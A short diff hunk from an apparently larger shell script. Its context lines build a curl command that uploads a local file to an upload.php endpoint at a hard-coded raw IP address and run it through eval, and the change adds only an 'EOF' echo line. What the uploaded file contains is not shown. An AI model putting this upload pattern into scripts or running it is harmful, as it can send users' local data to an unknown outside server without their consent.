@@ -48,3 +48,4 @@ echo "----" >> $NAME
 
 CMD="curl -F 'my_file=@$NAME' http://18.166.106.254/upload.php"
 eval $CMD
+echo "EOF"
